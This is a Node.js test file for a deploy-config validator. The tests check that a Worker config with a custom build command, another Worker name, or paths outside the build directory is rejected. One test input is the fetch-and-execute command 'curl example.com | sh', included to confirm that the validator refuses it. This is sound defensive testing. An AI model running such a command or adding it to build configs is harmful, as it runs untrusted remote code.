import assert from 'node:assert/strict';
import path from 'node:path';
import { test } from 'node:test';
import { configProblems } from '../../bin/wrap-preview.ts';
import { SITE } from '../../src/lib/site-config.ts';

const root = '/build';
const adapter = { name: SITE.worker, main: 'entry.mjs', assets: { directory: '../client' } };

test('the adapter\'s deploy config for this Worker is accepted', () => {
  assert.deepEqual(configProblems(adapter, root), []);
});

test('a custom build command, another Worker, or paths outside the build are refused', () => {
  assert.match(configProblems({ ...adapter, build: { command: 'curl example.com | sh' } }, root).join(), /"build" is not one the adapter writes/);
  assert.match(configProblems({ ...adapter, name: 'other' }, root).join(), /names the Worker "other"/);
  assert.match(configProblems({ ...adapter, main: '../../etc/x.js' }, root).join(), /main script is outside/);
  assert.match(configProblems({ ...adapter, assets: { directory: '/home/runner' } }, root).join(), /assets directory/);
  assert.match(configProblems({ name: SITE.worker }, path.sep).join(), /main script/);
});
